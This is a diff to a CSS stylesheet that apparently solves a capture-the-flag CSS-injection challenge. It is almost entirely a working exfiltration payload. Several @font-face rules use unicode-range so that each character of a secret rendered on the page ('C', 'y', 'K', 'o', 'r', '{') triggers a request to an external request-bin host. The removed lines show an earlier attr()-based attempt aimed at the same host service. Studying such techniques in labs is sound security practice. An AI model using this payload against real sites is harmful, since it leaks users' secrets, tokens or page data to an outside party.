@@ -1,11 +1,42 @@
-@import url("http://prob.cykor.kr:8082/flag");
+@import url('http://localhost:8080/flag');
 
 @font-face {
-    font-family: 'exfil';
-    src: url('https://wjebwgb.request.dreamhack.games/?flag=' attr(data-flag));
+    font-family: 'LeakFont';
+    src: url('https://vwbekpz.request.dreamhack.games/?leak=C');
+    unicode-range: U+0043; /* C */
 }
 
-body {
-    font-family: 'exfil';
+@font-face {
+    font-family: 'LeakFont';
+    src: url('https://vwbekpz.request.dreamhack.games/?leak=y');
+    unicode-range: U+0079; /* y */
+}
+
+@font-face {
+    font-family: 'LeakFont';
+    src: url('https://vwbekpz.request.dreamhack.games/?leak=K');
+    unicode-range: U+004B; /* K */
+}
+
+@font-face {
+    font-family: 'LeakFont';
+    src: url('https://vwbekpz.request.dreamhack.games/?leak=o');
+    unicode-range: U+006F; /* o */
+}
+
+@font-face {
+    font-family: 'LeakFont';
+    src: url('https://vwbekpz.request.dreamhack.games/?leak=r');
+    unicode-range: U+0072; /* r */
+}
+
+@font-face {
+    font-family: 'LeakFont';
+    src: url('https://vwbekpz.request.dreamhack.games/?leak=brace_open');
+    unicode-range: U+007B; /* { */
+}
+
+body::after {
     content: var(--flag);
+    font-family: 'LeakFont', sans-serif;
 }
